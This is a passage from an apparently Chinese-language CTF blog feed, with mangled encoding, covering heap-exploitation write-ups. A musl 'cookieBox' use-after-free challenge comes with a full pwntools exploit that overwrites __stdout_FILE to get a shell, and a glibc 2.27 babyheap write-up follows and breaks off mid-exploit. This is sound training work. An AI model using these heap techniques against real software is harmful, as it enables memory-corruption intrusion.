)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )<span class="comment">// éå† bss æ®µ</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;buf)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )<span class="comment">// å¯»æ‰¾ç©ºçš„å†…å­˜ç”¨äºå­˜å‚¨å †æŒ‡é’ˆ</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = *(&amp;nbytes + i);</span><br><span class="line">      <span class="keyword">if</span> ( !result )<span class="comment">// å¯»æ‰¾ç©ºçš„å†…å­˜ç”¨äºå­˜å‚¨å †å¤§å°</span></span><br><span class="line">      &#123;</span><br><span class="line">        (&amp;buf)[i] = *&amp;size[<span class="number">1</span>];<span class="comment">// åªæœ‰æ‰¾åˆ°ä¸¤ä¸ª index ç›¸åŒä¸ºç©ºæ‰è¿›è¡Œè®¾ç½®</span></span><br><span class="line">        *(&amp;nbytes + i) = size[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400B69</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((&amp;buf)[v1]);<span class="comment">// UAF</span></span><br><span class="line">  *(&amp;nbytes + v1) = <span class="number">0</span>;<span class="comment">// åªæ¸…ç©º bss ä¸Šç›¸åº”çš„å † sizeï¼Œè€Œæœªæ¸…ç©ºå¯¹åº”æŒ‡é’ˆ</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDIT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400C59</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; (&amp;buf)[v1] &amp;&amp; *(&amp;nbytes + v1) )<span class="comment">// æ£€æŸ¥ bss ä¸Šå¯¹åº”çš„å †æŒ‡é’ˆå’Œå † size</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input the content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (&amp;buf)[v1], *(&amp;nbytes + v1));<span class="comment">// æ ¹æ® bss ä¸Šå † size è¯»å–æ•°æ®</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br></pre></td></tr></table></figure><p>SHOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400BE1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] || !*(&amp;nbytes + v1) )<span class="comment">// åŒæ ·ä¼šæ£€æµ‹å †æŒ‡é’ˆå’Œå † size</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((&amp;buf)[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>è°ƒè¯•å‘½ä»¤ï¼š<code>p/x mal</code>å¯ä»¥æŸ¥çœ‹ mal å †ç®¡ç†å™¨ã€‚</p><ol><li><p>ç”±äºé™æ€å †å†…å­˜åˆè¯•åŒ–åï¼Œæ‰“å¼€ gdbè°ƒè¯•å‘ç°ï¼Œbin ä¸­å·²æœ‰ä¸€äº› chunkï¼ˆä¸€ä¸ªåœ¨ç¨‹åºæ®µä¸Šï¼Œä¸€ä¸ªåœ¨libcä¸Šï¼‰ï¼Œä¸” idx &gt; 32ï¼Œä¸çŸ¥ä¸ºä½•éœ€è¦ç”³è¯· 4 æ¬¡æ‰èƒ½ç”³è¯·å®Œï¼ˆä¸åº”è¯¥æ˜¯ 2 æ¬¡å—ï¼Ÿä¸è¿‡å¯¹åšé¢˜æ²¡æœ‰å½±å“ï¼‰ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041212424.png" alt="image-20230904121226225" style="zoom:67%;" /></li><li><p>ç”±äºé™æ€å †åˆå§‹åŒ–ï¼Œå› æ­¤å¾ˆå®¹æ˜“å°±å¯ä»¥æ³„éœ²å‡º libc åŸºå€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨ uaf å®ç°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †ï¼ˆç›®æ ‡å †ï¼‰ï¼Œä¸€ä¸ªç”¨äº freeï¼Œä¸€ä¸ªç”¨äº editï¼Œ</p><p>å†é‡Šæ”¾ä¸€ä¸ªå †ä½¿å¾—ç›®æ ‡å †å’Œè¯¥å †å¤„äºåŒä¸€ bin ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹ç›®æ ‡å †çš„ next æŒ‡é’ˆæŒ‡å‘ __stdout_FILEï¼Œ</p><p>ä¿®æ”¹å…¶ prev æŒ‡é’ˆæŒ‡å‘ç›®æ ‡åœ°å€ addr-0x10,</p><p>å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¾¾åˆ° attackï¼Œå‘ addr ä¸­å†™å…¥__stdout_FILEï¼Œ</p><p>è¿™é‡Œçš„ addr å³ä¸º bss ä¸Šçš„ idx2 å¯¹åº”çš„å †æŒ‡é’ˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602070</span>-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹ç›®æ ‡å †æŒ‡é’ˆï¼Œå³ä¿®æ”¹ __stdout_FILE ç»“æ„ä½“ï¼Œé€šè¿‡ puts è§¦å‘é“¾å­ï¼Œæ‰“å…¶ä»– FILE é“¾å­çš„æ—¶å€™å¯èƒ½éœ€è¦ä¿è¯ <code>wpos != wbase</code>ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041226665.png" alt="image-20230904122654594" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure></li></ol><p>è¿˜æœ‰ä¸€ç§è§£é¢˜æ€è·¯å°±æ˜¯åœ¨ attack æ—¶æ”¹ addr ä¸º mal ä¸Šçš„å¯¹åº”çš„ binç»“æ„ä½“ï¼Œä¿®æ”¹å…¶ headï¼Œä¹Ÿèƒ½ç”³è¯·åˆ°å¯¹åº”å†…å­˜ã€‚</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the size:\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">mal = libc_base + <span class="number">0x292ac0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é™¤äº†å­¦ä¹  glibc çš„å †ç®¡ç†æœºåˆ¶å¤–ï¼Œmusl ä¹Ÿå¼€å§‹æä¸Šè¡Œç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºä»¥å‰æ€»æ˜¯ç”¨æ¨¡æ¿æ€è·¯åšé¢˜ï¼Œå¾ˆå¤šä¸œè¥¿æ€»æ˜¯æµ®äºè¡¨é¢ï¼Œä¸èƒ½å¾ˆå¥½åœ°ç³»ç»Ÿæ€§ç†è§£ã€‚å› æ­¤æœ‰äº†å›ç‚‰é‡é€ çš„æƒ³æ³•ï¼Œå¸Œæœ›èƒ½ä»æ ¹æœ¬ä¸Šç†è§£å †ç®¡ç†çš„æœºåˆ¶ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>é«˜ç‰ˆæœ¬å †å—åˆ©ç”¨ç»ƒä¹ </title>
    <link href="http://example.com/2023/08/26/heap/"/>
    <id>http://example.com/2023/08/26/heap/</id>
    <published>2023-08-26T07:11:39.000Z</published>
    <updated>2023-09-26T03:37:34.345Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›å †é¢˜çš„ç»ƒä¹ ã€‚</p><span id="more"></span><h2 id="gdbè°ƒè¯•å‘½ä»¤"><a href="#gdbè°ƒè¯•å‘½ä»¤" class="headerlink" title="gdbè°ƒè¯•å‘½ä»¤"></a>gdbè°ƒè¯•å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p *_IO_list_all</span><br><span class="line">p *(struct _IO_FILE_plus *)addr</span><br><span class="line">p *(struct _IO_wide_data *)addr</span><br><span class="line">p *(const struct _IO_jump_t *)addr</span><br></pre></td></tr></table></figure><h2 id="libc2-27"><a href="#libc2-27" class="headerlink" title="libc2.27"></a>libc2.27</h2><h3 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h3><p>å¼•å…¥äº†<code>tcache</code>å †ç®¡ç†æœºåˆ¶ï¼Œ<code>__free_hook</code>å’Œ<code>__malloc_hook</code>éƒ½è¿˜åœ¨ï¼Œé€šè¿‡<code>bk</code>æŒ‡é’ˆæ£€æµ‹æ˜¯å¦å­˜åœ¨<code>double free</code>ã€‚</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>ä¾‹é¢˜ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ¥æºï¼šzjctf2022çœèµ›åˆèµ›-babyheap</span><br><span class="line">libcç‰ˆæœ¬ï¼šubuntu2.27-3-1.6</span><br><span class="line">æ¼æ´ï¼šUAF</span><br><span class="line">é™åˆ¶ï¼šå †å—å¤§å° &lt;= 0x7f</span><br><span class="line">     addæ¬¡æ•° &lt;= 7</span><br></pre></td></tr></table></figure><p>MENUï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delete note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;input your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADDï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span> &amp;&amp; heap[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full note&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size: &quot;</span>);</span><br><span class="line">  v2 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect size&quot;</span>);</span><br><span class="line">  heap[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  heap_size[i] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDITï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v1 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">6</span> || !heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, heap[v1], heap_size[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SHOWï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v1 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">6</span> || !heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(heap[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETEï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v0 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">6</span> || !heap[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ€è·¯1ï¼Œä¹Ÿæ˜¯EXPçš„æ€è·¯"><a href="#æ€è·¯1ï¼Œä¹Ÿæ˜¯EXPçš„æ€è·¯" class="headerlink" title="æ€è·¯1ï¼Œä¹Ÿæ˜¯EXPçš„æ€è·¯"></a>æ€è·¯1ï¼Œä¹Ÿæ˜¯EXPçš„æ€è·¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. æ„é€ double freeï¼Œæ³„éœ²å‡ºheap_baseçš„åœ°å€</span><br><span class="line">2. åˆ©ç”¨double freeï¼Œç”³è¯·åˆ°tcache binï¼Œå¡«æ»¡0x80çš„æ•°é‡</span><br><span class="line">3. é‡Šæ”¾å †å—è‡³unsorted binï¼Œæ‹¿åˆ°libc_base</span><br><span class="line">4. å†æ¬¡æ„é€ double freeï¼ŒåŠ«æŒ__free_hook</span><br></pre></td></tr></table></figure><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 